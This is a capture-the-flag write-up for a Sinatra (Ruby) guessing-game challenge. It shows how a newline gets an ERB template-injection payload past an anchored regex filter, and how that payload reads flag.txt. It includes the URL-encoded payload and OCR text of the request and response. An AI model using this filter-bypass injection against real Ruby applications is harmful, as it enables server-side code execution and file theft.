# Embed Flow
> This guy wants you to guess his favorite programming language, but missed setting up the pattern correctly.

## About the Challenge
We got a website and this website is using Sinatara (Ruby). Here is the preview of the challenge


[Image extracted text: Which programming language do you think Im fluent in?
Hint: Im more versatile than a Swiss Army knife when it comes to programmingl
Enter your guess
Make a Wild Guessl
Your guess: test
Try
againl]


If we try to input `'` character, we'll get an error message like this:


[Image extracted text: Which programming language do you think Im fluent in?
Hint: Im more versatile than a Swiss
knife when it comes to programming!
Make a Wild Guessl
Your guess: Malicious Input Detectedl You cant bypass the regex ^[0-9a-zln ]+Sli hehe
Army]


## How to Solve?
After seeing the regex pattern, I immediately knew this was similar to a HTB challenge called `Neonify` (https://blog.devops.dev/ssti-bypass-filter-0-9a-z-i-08a5b3b98def). So I used the same payload to read the flag :D

```
test
<%= File.open('flag.txt').read %>
test
```

And then encode it using urlencode and it will become

```
test%0A%3C%25=%20File.open('flag.txt').read%20%25%3E%0Atest
```


[Image extracted text: POST
HTTP/1.1
12
<html>
2
Host:
embed-flow. ictfS.ninja
13
<head>
3 Content-Length:
65
14
<title>
Cache-Control:
max-age-0
Guess
the
Polyglot !
5
Upgrade-Insecure-Requests:
</title>
6 Origin:
http: / /embed-flow
ictfS.ninja
15
<link
rel-"stylesheet"
href=" /style.css">
Content-Type
application/X-WWW-form-urlencoded
16
</head>
User-Agent
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
AppleWebKit/537
36
17
<body>
(KHTML ,
like
Gecko)
Chrome/123.0.6312.122
Safari/537
36
18
<hz>
Accept:
Which
programming  Language
do
you
think
I'm
fluent
in?
text/html,application/xhtml+xml,application/xml;
9 , image/avif , image/webp, i
</hz>
mage/apng
*/*;9=0.8,application/signed-exchange;V=b3;9=0.7
19
<p>
10
Referer:
http: / /embed-flow. ictf5.ninjal
Hint:
I
more
versatile
than
Swiss Army
knife
when
it
comes
to
11 Accept-Encoding:
gzip,
deflate,
br
programming !
12 Accept-Language
en-US, en;q=0.9
</p>
13
Connection:
close
20
<form
action=" /"
method="post">
14
21
input type-"text
name=
guess
placeholder="Enter
your
guess
required
15
guess=test"0A"3C825-%20File.open (
txt
)
read%20825%3E%OAtest
22
<button
type=
submit">
Make
Wild
Guess
</button>
23
formz
24
25
Try again!
<[p>
26
27
28
Your
guess
test
29
ictf{ruby_r3g3x_n3w_lln3_413rt}
30
31
test
p>
32
33
body
34
/html>
35
Search
highlights
Search
highlights
q=0 .
flag]


```
ictf{ruby_r3g3x_n3w_l1n3_4l3rt}
```